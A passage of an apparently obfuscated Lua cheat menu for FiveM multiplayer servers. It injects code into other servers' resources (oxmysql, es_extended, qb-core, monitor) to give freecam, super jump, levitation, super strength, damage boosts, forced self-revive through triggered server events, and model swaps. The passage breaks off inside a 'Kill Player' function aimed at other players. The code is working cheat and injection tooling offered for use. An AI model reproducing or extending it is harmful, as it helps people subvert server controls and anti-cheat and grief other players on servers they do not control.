                        local speed = baseSpeed; if IsDisabledControlPressed(0, 21) then speed = boostSpeed end; if IsDisabledControlPressed(0, 19) then speed = slowSpeed end
                        if IsDisabledControlPressed(0, 32) then camPos = camPos + direction * speed end; if IsDisabledControlPressed(0, 33) then camPos = camPos - direction * speed end; if IsDisabledControlPressed(0, 34) then camPos = camPos - right * speed end; if IsDisabledControlPressed(0, 35) then camPos = camPos + right * speed end; if IsDisabledControlPressed(0, 22) then camPos = camPos + vector3(0, 0, 1.0) * speed end; if IsDisabledControlPressed(0, 36) then camPos = camPos - vector3(0, 0, 1.0) * speed end
                        local mX, mY = GetControlNormal(0,1)*mouseSensitivity, GetControlNormal(0,2)*mouseSensitivity; camRot.x = clamp(camRot.x-mY, -89.0, 89.0); camRot.z = camRot.z-mX
                        SetCamCoord(freecamHandle, camPos.x, camPos.y, camPos.z); SetCamRot(freecamHandle, camRot.x, camRot.y, camRot.z, 2); SetFocusPosAndVel(camPos.x, camPos.y, camPos.z, 0.0, 0.0, 0.0)
                        local ray = StartShapeTestRay(camPos.x, camPos.y, camPos.z, camPos.x+direction.x*1000.0, camPos.y+direction.y*1000.0, camPos.z+direction.z*1000.0, -1, PlayerPedId(), 7); local _, hit, coords, _, entity = GetShapeTestResult(ray); if hit then targetCoords, targetEntity = coords, entity else targetCoords, targetEntity = nil, nil end
                    end
                end
                
                startFreecam = function()
                    if isFreecamActive then return end
                    isFreecamActive = true
                    local startPos, startRot, startFov = GetGameplayCamCoord(), GetGameplayCamRot(2), GetGameplayCamFov()
                    freecamHandle = CreateCamWithParams("DEFAULT_SCRIPTED_CAMERA", startPos.x, startPos.y, startPos.z, startRot.x, startRot.y, startRot.z, startFov, true, 2)
                    
                    if not DoesCamExist(freecamHandle) then isFreecamActive = false; return end

                    RenderScriptCams(true, false, 0, true, true)
                    SetCamActive(freecamHandle, true)
                    CreateThread(drawThread)
                    CreateThread(logicThread)
                    CreateThread(cameraThread)
                end

                stopFreecam = function()
                    if not isFreecamActive then return end
                    isFreecamActive = false
                    if freecamHandle and DoesCamExist(freecamHandle) then SetCamActive(freecamHandle, false); RenderScriptCams(false, false, 0, true, true); DestroyCam(freecamHandle, false) end
                    Wait(10); SetFocusEntity(PlayerPedId()); ClearFocus()
                    freecamHandle = nil
                end
                
                CreateThread(function()
                    while g_FreecamFeatureEnabled and not Unloaded do Wait(0)
                        if IsDisabledControlJustPressed(0, 74) then -- H key
                            if isFreecamActive then stopFreecam()
                            else startFreecam() end
                        end
                    end
                end)
            end
            
            initializeFreecam()
        ]]);end,function() MachoInjectResource((v48("core") and "core") or (v48("es_extended") and "es_extended") or (v48("qb-core") and "qb-core") or (v48("monitor") and "monitor") or "any" ,[[
            g_FreecamFeatureEnabled = false
            if isFreecamActive and stopFreecam then stopFreecam() end
        ]]);end);MachoMenuCheckbox(v39[1 + 0 ],"Super Jump",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if xCvBnMqWeRtYuIo == nil then xCvBnMqWeRtYuIo = false end
            xCvBnMqWeRtYuIo = true

            local function JcWT5vYEq1()
                local yLkPwOiUtReAzXc = CreateThread
                yLkPwOiUtReAzXc(function()
                    while xCvBnMqWeRtYuIo and not Unloaded do
                        local hGfDsAzXcVbNmQw = SetSuperJumpThisFrame
                        local eRtYuIoPaSdFgHj = PlayerPedId()
                        local oPlMnBvCxZlKjHg = PlayerId()

                        hGfDsAzXcVbNmQw(oPlMnBvCxZlKjHg)
                        Wait(0)
                    end
                end)
            end

            JcWT5vYEq1()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            xCvBnMqWeRtYuIo = false
        ]]);end);MachoMenuCheckbox(v39[1 + 0 ],"Levitation",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            -- make helpers global so other chunks can use them
            function ScaleVector(vect, mult)
                return vector3(vect.x * mult, vect.y * mult, vect.z * mult)
            end

            function AddVectors(vect1, vect2)
                return vector3(vect1.x + vect2.x, vect1.y + vect2.y, vect1.z + vect2.z)
            end

            function ApplyForce(entity, direction)
                local XroXTNEFqxoWfH = ApplyForceToEntity
                XroXTNEFqxoWfH(entity, 3, direction, 0, 0, 0, false, false, true, true, false, true)
            end

            function SubVectors(vect1, vect2)
                return vector3(vect1.x - vect2.x, vect1.y - vect2.y, vect1.z - vect2.z)
            end

            function Oscillate(entity, position, angleFreq, dampRatio)
                local OBaTQqteIpmZVo = GetEntityVelocity
                local pos1 = ScaleVector(SubVectors(position, GetEntityCoords(entity)), (angleFreq * angleFreq))
                local pos2 = AddVectors(ScaleVector(OBaTQqteIpmZVo(entity), (2.0 * angleFreq * dampRatio)), vector3(0.0, 0.0, 0.1))
                local targetPos = SubVectors(pos1, pos2)
                ApplyForce(entity, targetPos)
            end

            function RotationToDirection(rot)
                local radZ = math.rad(rot.z)
                local radX = math.rad(rot.x)
                local cosX = math.cos(radX)
                return vector3(
                    -math.sin(radZ) * cosX,
                    math.cos(radZ) * cosX,
                    math.sin(radX)
                )
            end

            function GetClosestCoordOnLine(startCoords, endCoords, entity)
                local CDGcdMQhosGVCf = GetShapeTestResult
                local UaWIFHgeizhHua = StartShapeTestRay
                local result, hit, hitCoords, surfaceNormal, entityHit =
                    CDGcdMQhosGVCf(UaWIFHgeizhHua(startCoords.x, startCoords.y, startCoords.z, endCoords.x, endCoords.y, endCoords.z, -1, entity, 0))
                return hit == 1, hitCoords
            end

            function GetCameraLookingAtCoord(distance)
                local playerPed = PlayerPedId()
                local camRot = GetGameplayCamRot(2)
                local camCoord = GetGameplayCamCoord()
                local forwardVector = RotationToDirection(camRot)
                local destination = vector3(
                    camCoord.x + forwardVector.x * distance,
                    camCoord.y + forwardVector.y * distance,
                    camCoord.z + forwardVector.z * distance
                )
                local hit, endCoords = GetClosestCoordOnLine(camCoord, destination, playerPed)
                if hit then return endCoords else return destination end
            end
        ]]);MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function awfjawr57awt7f()
                nxtBFlQWMMeRLs = true

                local jIiIfikctHYrlH = CreateThread
                jIiIfikctHYrlH(function()
                    while nxtBFlQWMMeRLs and not Unloaded do
                        Wait(0)
                        local ped = PlayerPedId()

                        local SZxuJlyJQmGlZz = SetPedCanRagdoll
                        local valuOZfymjeVaH = IsEntityPlayingAnim
                        local IiHiLVRagMQhrn = RequestAnimDict
                        local mOZOquvggdnbod = HasAnimDictLoaded
                        local UFZdrZNXpLwpjT = TaskPlayAnim
                        local cQPIZtKyyWaVcY = GetCameraLookingAtCoord
                        local OyvuuAMyvjtIzD = GetGameplayCamRot
                        local XKWvPIkCKMXIfR = IsDisabledControlPressed  -- FIXED: missing '='

                        while XKWvPIkCKMXIfR(0, 22) do
                            SZxuJlyJQmGlZz(ped, false)

                            if not valuOZfymjeVaH(ped, "oddjobs@assassinate@construction@", "unarmed_fold_arms", 3) then
                                IiHiLVRagMQhrn("oddjobs@assassinate@construction@")
                                while not mOZOquvggdnbod("oddjobs@assassinate@construction@") do
                                    Wait(0)
                                end
                                UFZdrZNXpLwpjT(ped, "oddjobs@assassinate@construction@", "unarmed_fold_arms",
                                    8.0, -8.0, -1, 49, 0, false, false, false)
                            end

                            local camRot = OyvuuAMyvjtIzD(2)
                            local camHeading = (camRot.z + 360) % 360
                            local direction = cQPIZtKyyWaVcY(77)

                            SetEntityHeading(ped, camHeading)
                            Oscillate(ped, direction, 0.33, 0.9)

                            Wait(1)
                        end

                        if valuOZfymjeVaH(ped, "oddjobs@assassinate@construction@", "unarmed_fold_arms", 3) then
                            ClearPedTasks(ped)
                        end

                        SZxuJlyJQmGlZz(ped, true)
                    end
                end)
            end

            awfjawr57awt7f()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            nxtBFlQWMMeRLs = false
            ClearPedTasks(PlayerPedId())
        ]]);end);MachoMenuCheckbox(v39[1],"Super Strength",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if fgawjFmaDjdALaO == nil then fgawjFmaDjdALaO = false end
            fgawjFmaDjdALaO = true

            local holdingEntity = false
            local holdingCarEntity = false
            local holdingPed = false
            local heldEntity = nil
            local entityType = nil
            local awfhjawrasfs = CreateThread

            awfhjawrasfs(function()
                while fgawjFmaDjdALaO and not Unloaded do
                    Wait(0)
                    if holdingEntity and heldEntity then
                        local playerPed = PlayerPedId()
                        local headPos = GetPedBoneCoords(playerPed, 0x796e, 0.0, 0.0, 0.0)
                        DrawText3Ds(headPos.x, headPos.y, headPos.z + 0.5, "[Y] Drop Entity / [U] Attach Ped")
                        
                        if holdingCarEntity and not IsEntityPlayingAnim(playerPed, 'anim@mp_rollarcoaster', 'hands_up_idle_a_player_one', 3) then
                            RequestAnimDict('anim@mp_rollarcoaster')
                            while not HasAnimDictLoaded('anim@mp_rollarcoaster') do
                                Wait(100)
                            end
                            TaskPlayAnim(playerPed, 'anim@mp_rollarcoaster', 'hands_up_idle_a_player_one', 8.0, -8.0, -1, 50, 0, false, false, false)
                        elseif (holdingPed or not holdingCarEntity) and not IsEntityPlayingAnim(playerPed, 'anim@heists@box_carry@', 'idle', 3) then
                            RequestAnimDict('anim@heists@box_carry@')
                            while not HasAnimDictLoaded('anim@heists@box_carry@') do
                                Wait(100)
                            end
                            TaskPlayAnim(playerPed, 'anim@heists@box_carry@', 'idle', 8.0, -8.0, -1, 50, 0, false, false, false)
                        end

                        if not IsEntityAttached(heldEntity) then
                            holdingEntity = false
                            holdingCarEntity = false
                            holdingPed = false
                            heldEntity = nil
                        end
                    end
                end
            end)

            awfhjawrasfs(function()
                while fgawjFmaDjdALaO and not Unloaded do
                    Wait(0)
                    local playerPed = PlayerPedId()
                    local camPos = GetGameplayCamCoord()
                    local camRot = GetGameplayCamRot(2)
                    local direction = RotationToDirection(camRot)
                    local dest = vec3(camPos.x + direction.x * 10.0, camPos.y + direction.y * 10.0, camPos.z + direction.z * 10.0)

                    local rayHandle = StartShapeTestRay(camPos.x, camPos.y, camPos.z, dest.x, dest.y, dest.z, -1, playerPed, 0)
                    local _, hit, _, _, entityHit = GetShapeTestResult(rayHandle)
                    local validTarget = false

                    if hit == 1 then
                        entityType = GetEntityType(entityHit)
                        if entityType == 3 or entityType == 2 or entityType == 1 then
                            validTarget = true
                            local headPos = GetPedBoneCoords(playerPed, 0x796e, 0.0, 0.0, 0.0)
                            DrawText3Ds(headPos.x, headPos.y, headPos.z + 0.5, "[E] Pick Up / [Y] Drop")
                        end
                    end

                    if IsDisabledControlJustReleased(0, 38) then
                        if validTarget and not holdingEntity then
                            holdingEntity = true
                            heldEntity = entityHit

                            local wfuawruawts = AttachEntityToEntity

                            if entityType == 3 then
                                wfuawruawts(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 0.0, 0.2, 0.0, 0.0, 0.0, 0.0, true, true, false, true, 1, true)
                            elseif entityType == 2 then
                                holdingCarEntity = true
                                wfuawruawts(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 1.0, 0.5, 0.0, 0.0, 0.0, 0.0, true, true, false, false, 1, true)
                            elseif entityType == 1 then
                                holdingPed = true
                                wfuawruawts(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 1.0, 0.5, 0.0, 0.0, 0.0, 0.0, true, true, false, false, 1, true)
                            end
                        end
                    elseif IsDisabledControlJustReleased(0, 246) then
                        if holdingEntity then
                            local wgfawhtawrs = DetachEntity
                            local dfgjsdfuwer = ApplyForceToEntity
                            local sdgfhjwserw = ClearPedTasks

                            wgfawhtawrs(heldEntity, true, true)
                            dfgjsdfuwer(heldEntity, 1, direction.x * 500, direction.y * 500, direction.z * 500, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                            holdingEntity = false
                            holdingCarEntity = false
                            holdingPed = false
                            heldEntity = nil
                            sdgfhjwserw(PlayerPedId())
                        end
                    end
                end
            end)

            function RotationToDirection(rotation)
                local adjustedRotation = vec3((math.pi / 180) * rotation.x, (math.pi / 180) * rotation.y, (math.pi / 180) * rotation.z)
                local direction = vec3(-math.sin(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.cos(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.sin(adjustedRotation.x))
                return direction
            end

            function DrawText3Ds(x, y, z, text)
                local onScreen, _x, _y = World3dToScreen2d(x, y, z)
                local px, py, pz = table.unpack(GetGameplayCamCoords())
                local scale = (1 / GetDistanceBetweenCoords(px, py, pz, x, y, z, 1)) * 2
                local fov = (1 / GetGameplayCamFov()) * 100
                scale = scale * fov

                if onScreen then
                    SetTextScale(0.0 * scale, 0.35 * scale)
                    SetTextFont(0)
                    SetTextProportional(1)
                    SetTextColour(255, 255, 255, 215)
                    SetTextDropshadow(0, 0, 0, 0, 155)
                    SetTextEdge(2, 0, 0, 0, 150)
                    SetTextDropShadow()
                    -- SetTextOutline()
                    SetTextEntry("STRING")
                    SetTextCentre(1)
                    AddTextComponentString(text)
                    DrawText(_x, _y)
                end
            end
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            fgawjFmaDjdALaO = false
        ]]);end);MachoMenuCheckbox(v39[2 -1 ],"Super Punch",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if qWeRtYuIoPlMnBv == nil then qWeRtYuIoPlMnBv = false end
            qWeRtYuIoPlMnBv = true

            local function NdaFBuHkvo()
                local uTrEsAzXcVbNmQw = CreateThread
                uTrEsAzXcVbNmQw(function()
                    while qWeRtYuIoPlMnBv and not Unloaded do
                        local nBvCxZlKjHgFdSa = SetPlayerMeleeWeaponDamageModifier
                        local cVbNmQwErTyUiOp = SetPlayerVehicleDamageModifier
                        local bNmQwErTyUiOpAs = SetWeaponDamageModifier
                        local sDfGhJkLqWeRtYu = PlayerId()
                        local DamageRateValue = 150.0
                        local WeaponNameForDamage = "WEAPON_UNARMED"


                        nBvCxZlKjHgFdSa(sDfGhJkLqWeRtYu, DamageRateValue)
                        cVbNmQwErTyUiOp(sDfGhJkLqWeRtYu, DamageRateValue)
                        bNmQwErTyUiOpAs(GetHashKey(WeaponNameForDamage), DamageRateValue)

                        Wait(0)
                    end
                end)
            end

            NdaFBuHkvo()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local qWeRtYuIoPlMnBv = false
            local nBvCxZlKjHgFdSa = SetPlayerMeleeWeaponDamageModifier
            local cVbNmQwErTyUiOp = SetPlayerVehicleDamageModifier
            local bNmQwErTyUiOpAs = SetWeaponDamageModifier
            local sDfGhJkLqWeRtYu = PlayerId()

            nBvCxZlKjHgFdSa(sDfGhJkLqWeRtYu, 1.0)
            cVbNmQwErTyUiOp(sDfGhJkLqWeRtYu, 1.0)
            bNmQwErTyUiOpAs(GetHashKey("WEAPON_UNARMED"), 1.0)
        ]]);end);MachoMenuCheckbox(v39[1],"Throw From Vehicle",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if zXpQwErTyUiPlMn == nil then zXpQwErTyUiPlMn = false end
            zXpQwErTyUiPlMn = true

            local function qXzRP7ytKW()
                local iLkMzXvBnQwSaTr = CreateThread
                iLkMzXvBnQwSaTr(function()
                    while zXpQwErTyUiPlMn and not Unloaded do
                        local vBnMaSdFgTrEqWx = SetRelationshipBetweenGroups
                        vBnMaSdFgTrEqWx(5, GetHashKey('PLAYER'), GetHashKey('PLAYER'))
                        Wait(0)
                    end
                end)
            end

            qXzRP7ytKW()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            zXpQwErTyUiPlMn = false
        ]]);end);MachoMenuCheckbox(v39[3 -2 ],"Force Third Person",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if kJfGhTrEeWqAsDz == nil then kJfGhTrEeWqAsDz = false end
            kJfGhTrEeWqAsDz = true

            local function pqkTRWZ38y()
                local gKdNqLpYxMiV = CreateThread
                gKdNqLpYxMiV(function()
                    while kJfGhTrEeWqAsDz and not Unloaded do
                        local qWeRtYuIoPlMnBv = SetFollowPedCamViewMode
                        local aSdFgHjKlQwErTy = SetFollowVehicleCamViewMode

                        qWeRtYuIoPlMnBv(0)
                        aSdFgHjKlQwErTy(0)
                        Wait(0)
                    end
                end)
            end

            pqkTRWZ38y()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            kJfGhTrEeWqAsDz = false
        ]]);end);MachoMenuCheckbox(v39[1],"Force Driveby",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if zXcVbNmQwErTyUi == nil then zXcVbNmQwErTyUi = false end
            zXcVbNmQwErTyUi = true

            local function UEvLBcXqM6()
                local cVbNmAsDfGhJkLz = CreateThread
                cVbNmAsDfGhJkLz(function()
                    while zXcVbNmQwErTyUi and not Unloaded do
                        local lKjHgFdSaZxCvBn = SetPlayerCanDoDriveBy
                        local eRtYuIoPaSdFgHi = PlayerPedId()

                        lKjHgFdSaZxCvBn(eRtYuIoPaSdFgHi, true)
                        Wait(0)
                    end
                end)
            end

            UEvLBcXqM6()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            zXcVbNmQwErTyUi = false
        ]]);end);MachoMenuCheckbox(v39[1 + 0 ],"Anti-Headshot",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if yHnvrVNkoOvGMWiS == nil then yHnvrVNkoOvGMWiS = false end
            yHnvrVNkoOvGMWiS = true

            local eeitKYqDwYbPslTW = CreateThread
            local function LIfbdMbeIAeHTnnx()
                eeitKYqDwYbPslTW(function()
                    while yHnvrVNkoOvGMWiS and not Unloaded do
                        local fhw72q35d8sfj = SetPedSuffersCriticalHits
                        fhw72q35d8sfj(PlayerPedId(), false)
                        Wait(0)
                    end
                end)
            end

            LIfbdMbeIAeHTnnx()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            yHnvrVNkoOvGMWiS = false
            fhw72q35d8sfj(PlayerPedId(), true)
        ]]);end);MachoMenuCheckbox(v39[1],"Anti-Freeze",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if nHgFdSaZxCvBnMq == nil then nHgFdSaZxCvBnMq = false end
            nHgFdSaZxCvBnMq = true

            local sdfw3w3tsdg = CreateThread
            local function XELa6FJtsB()
                sdfw3w3tsdg(function()
                    while nHgFdSaZxCvBnMq and not Unloaded do
                        local fhw72q35d8sfj = FreezeEntityPosition
                        local segfhs347dsgf = ClearPedTasks

                        if IsEntityPositionFrozen(PlayerPedId()) then
                            fhw72q35d8sfj(PlayerPedId(), false)
                            segfhs347dsgf(PlayerPedId())
                        end
                        
                        Wait(0)
                    end
                end)
            end

            XELa6FJtsB()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            nHgFdSaZxCvBnMq = false
        ]]);end);MachoMenuCheckbox(v39[1 + 0 ],"Anti-Blackscreen",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if aDjsfmansdjwAEl == nil then aDjsfmansdjwAEl = false end
            aDjsfmansdjwAEl = true

            local sdfw3w3tsdg = CreateThread
            local function XELWAEDa6FJtsB()
                sdfw3w3tsdg(function()
                    while aDjsfmansdjwAEl and not Unloaded do
                        DoScreenFadeIn(0)
                        Wait(0)
                    end
                end)
            end

            XELWAEDa6FJtsB()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            aDjsfmansdjwAEl = false
        ]]);end);local v51=MachoMenuInputbox(v39[2 + 0 ],"Model Name:","...");MachoMenuButton(v39[2 + 0 ],"Change Model",function() local v179=MachoMenuGetInputbox(v51);if ((type(v179)=="string") and (v179~="")) then local v283=0;local v284;while true do if (v283==(0 + 0)) then v284=string.format([[
                local function GykR8qjWTp()
                    local nHgFdSaZxCvBnMq = RequestModel
                    local xCvBnMqWeRtYuIo = HasModelLoaded
                    local aSdFgHjKlQwErTy = SetPlayerModel
                    local oPlMnBvCxZlKjHg = SetPedDefaultComponentVariation

                    nHgFdSaZxCvBnMq(GetHashKey("%s"))
                    while not xCvBnMqWeRtYuIo(GetHashKey("%s")) do
                        Wait(1)
                    end
                    
                    aSdFgHjKlQwErTy(PlayerId(), GetHashKey("%s"))
                    oPlMnBvCxZlKjHg(PlayerPedId())
                end

                GykR8qjWTp()
            ]],v179,v179,v179);MachoInjectResource((v48("oxmysql") and "oxmysql") or "any" ,v284);break;end end end end);MachoMenuButton(v39[2],"White Thug Drip",function() local v180=1433 -(797 + 636) ;while true do if (v180==(0 -0)) then function WhiteThugDrip() local v336=0;local v337;while true do if (v336==0) then v337=PlayerPedId();SetPedComponentVariation(v337,11,1728 -(1427 + 192) ,0 + 0 ,4 -2 );v336=1 + 0 ;end if (v336==(1 + 1)) then SetPedComponentVariation(v337,4,382 -(192 + 134) ,0,1278 -(316 + 960) );SetPedComponentVariation(v337,4 + 2 ,15 + 4 ,0 + 0 ,7 -5 );v336=554 -(83 + 468) ;end if (v336==(1807 -(1202 + 604))) then SetPedComponentVariation(v337,37 -29 ,24 -9 ,0,5 -3 );SetPedComponentVariation(v337,3,330 -(45 + 280) ,0 + 0 ,2);v336=2 + 0 ;end if (v336==(2 + 1)) then SetPedPropIndex(v337,0,1,0 + 0 ,true);break;end end end WhiteThugDrip();break;end end end);MachoMenuButton(v39[1 + 1 ],"JTG Mafia Drip",function() local v181=0 -0 ;while true do if (v181==(1911 -(340 + 1571))) then function JTGMafia() local v338=0 + 0 ;local v339;while true do if (v338==(1772 -(1733 + 39))) then v339=PlayerPedId();SetPedComponentVariation(v339,30 -19 ,1039 -(125 + 909) ,0,1950 -(1096 + 852) );v338=1;end if (v338==(2 + 1)) then SetPedPropIndex(v339,0 -0 ,26,0 + 0 ,true);SetPedPropIndex(v339,513 -(409 + 103) ,239 -(46 + 190) ,0,true);break;end if (v338==(97 -(51 + 44))) then SetPedComponentVariation(v339,4,12 + 30 ,1317 -(1114 + 203) ,728 -(228 + 498) );SetPedComponentVariation(v339,6,6,0 + 0 ,2 + 0 );v338=3;end if (v338==(664 -(174 + 489))) then SetPedComponentVariation(v339,20 -12 ,1920 -(830 + 1075) ,0,526 -(303 + 221) );SetPedComponentVariation(v339,1272 -(231 + 1038) ,5,0 + 0 ,1164 -(171 + 991) );v338=8 -6 ;end end end JTGMafia();break;end end end);MachoMenuButton(v39[7 -4 ],"Heal",function() SetEntityHealth(PlayerPedId(),499 -299 );end);MachoMenuButton(v39[3],"Armor",function() SetPedArmour(PlayerPedId(),81 + 19 );end);MachoMenuButton(v39[3],"Fill Hunger",function() MachoInjectResource2(10 -7 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function DawrjatjsfAW()
                TriggerEvent('esx_status:set', 'hunger', 1000000)
            end

            DawrjatjsfAW()
        ]]);end);MachoMenuButton(v39[8 -5 ],"Fill Thirst",function() MachoInjectResource2(4 -1 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function sWj238fsMAw()
                TriggerEvent('esx_status:set', 'thirst', 1000000)
            end

            sWj238fsMAw()
        ]]);end);MachoMenuButton(v39[9 -6 ],"Revive",function() MachoInjectResource2(1251 -(111 + 1137) ,(v48("ox_inventory") and "ox_inventory") or (v48("ox_lib") and "ox_lib") or (v48("es_extended") and "es_extended") or (v48("qb-core") and "qb-core") or (v48("wasabi_ambulance") and "wasabi_ambulance") or (v48("ak47_ambulancejob") and "ak47_ambulancejob") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function AcjU5NQzKw()
                if GetResourceState('prp-injuries') == 'started' then
                    TriggerEvent('prp-injuries:hospitalBedHeal', skipHeal)
                    return
                end

                if GetResourceState('es_extended') == 'started' then
                    TriggerEvent("esx_ambulancejob:revive")
                    return
                end

                if GetResourceState('qb-core') == 'started' then
                    TriggerEvent("hospital:client:Revive")
                    return
                end

                if GetResourceState('wasabi_ambulance') == 'started' then
                    TriggerEvent("wasabi_ambulance:revive")
                    return
                end

                if GetResourceState('ak47_ambulancejob') == 'started' then
                    TriggerEvent("ak47_ambulancejob:revive")
                    return
                end

                NcVbXzQwErTyUiO = GetEntityHeading(PlayerPedId())
                BvCxZlKjHgFdSaP = GetEntityCoords(PlayerPedId())

                RtYuIoPlMnBvCxZ = NetworkResurrectLocalPlayer
                RtYuIoPlMnBvCxZ(BvCxZlKjHgFdSaP.x, BvCxZlKjHgFdSaP.y, BvCxZlKjHgFdSaP.z, NcVbXzQwErTyUiO, false, false, false, 1, 0)
            end

            AcjU5NQzKw()
        ]]);end);MachoMenuButton(v39[161 -(91 + 67) ],"Suicide",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function RGybF0JqEt()
                local aSdFgHjKlQwErTy = SetEntityHealth
                aSdFgHjKlQwErTy(PlayerPedId(), 0)
            end

            RGybF0JqEt()
        ]]);end);MachoMenuButton(v39[3],"Force Ragdoll",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function awfAEDSADWEf()
                local cWAmdjakwDksFD = SetPedToRagdoll
                cWAmdjakwDksFD(PlayerPedId(), 3000, 3000, 0, false, false, false)
            end

            awfAEDSADWEf()
        ]]);end);MachoMenuButton(v39[8 -5 ],"Clear Task",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function iPfT7kN3dU()
                local zXcVbNmAsDfGhJk = ClearPedTasksImmediately
                zXcVbNmAsDfGhJk(PlayerPedId())
            end

            iPfT7kN3dU()
        ]]);end);MachoMenuButton(v39[3],"Clear Vision",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function MsVqZ29ptY()
                local qWeRtYuIoPlMnBv = ClearTimecycleModifier
                local kJfGhTrEeWqAsDz = ClearExtraTimecycleModifier

                qWeRtYuIoPlMnBv()
                kJfGhTrEeWqAsDz()
            end

            MsVqZ29ptY()
        ]]);end);MachoMenuButton(v39[3],"Randomize Outfit",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function UxrKYLp378()
                local UwEsDxCfVbGtHy = PlayerPedId
                local FdSaQwErTyUiOp = GetNumberOfPedDrawableVariations
                local QwAzXsEdCrVfBg = SetPedComponentVariation
                local LkJhGfDsAqWeRt = SetPedHeadBlendData
                local MnBgVfCdXsZaQw = SetPedHairColor
                local RtYuIoPlMnBvCx = GetNumHeadOverlayValues
                local TyUiOpAsDfGhJk = SetPedHeadOverlay
                local ErTyUiOpAsDfGh = SetPedHeadOverlayColor
                local DfGhJkLzXcVbNm = ClearPedProp

                local function PqLoMzNkXjWvRu(component, exclude)
                    local ped = UwEsDxCfVbGtHy()
                    local total = FdSaQwErTyUiOp(ped, component)
                    if total <= 1 then return 0 end
                    local choice = exclude
                    while choice == exclude do
                        choice = math.random(0, total - 1)
                    end
                    return choice
                end

                local function OxVnBmCxZaSqWe(component)
                    local ped = UwEsDxCfVbGtHy()
                    local total = FdSaQwErTyUiOp(ped, component)
                    return total > 1 and math.random(0, total - 1) or 0
                end

                local ped = UwEsDxCfVbGtHy()

                QwAzXsEdCrVfBg(ped, 11, PqLoMzNkXjWvRu(11, 15), 0, 2)
                QwAzXsEdCrVfBg(ped, 6, PqLoMzNkXjWvRu(6, 15), 0, 2)
                QwAzXsEdCrVfBg(ped, 8, 15, 0, 2)
                QwAzXsEdCrVfBg(ped, 3, 0, 0, 2)
                QwAzXsEdCrVfBg(ped, 4, OxVnBmCxZaSqWe(4), 0, 2)

                local face = math.random(0, 45)
                local skin = math.random(0, 45)
                LkJhGfDsAqWeRt(ped, face, skin, 0, face, skin, 0, 1.0, 1.0, 0.0, false)

                local hairMax = FdSaQwErTyUiOp(ped, 2)
                local hair = hairMax > 1 and math.random(0, hairMax - 1) or 0
                QwAzXsEdCrVfBg(ped, 2, hair, 0, 2)
                MnBgVfCdXsZaQw(ped, 0, 0)

                local brows = RtYuIoPlMnBvCx(2)
                TyUiOpAsDfGhJk(ped, 2, brows > 1 and math.random(0, brows - 1) or 0, 1.0)
                ErTyUiOpAsDfGh(ped, 2, 1, 0, 0)

                DfGhJkLzXcVbNm(ped, 0)
                DfGhJkLzXcVbNm(ped, 1)
            end

            UxrKYLp378()
        ]]);end);MachoMenuButton(v40[1],"Kill Player",function() local v182=MachoMenuGetSelectedPlayer();if (v182 and (v182>0)) then MachoInjectResource((v48("oxmysql") and "oxmysql") or "any" ,([[
                local function UiLpKjHgFdSaTrEq()
                    local RvTyUiOpAsDfGhJ = %d

                    local dFrTgYhUjIkLoPl = CreateThread
                    dFrTgYhUjIkLoPl(function()
                        Wait(0)

                        local ZxCvBnMaSdFgTrEq = GetPlayerPed
                        local TyUiOpAsDfGhJkLz = GetEntityCoords
                        local QwErTyUiOpAsDfGh = ShootSingleBulletBetweenCoords
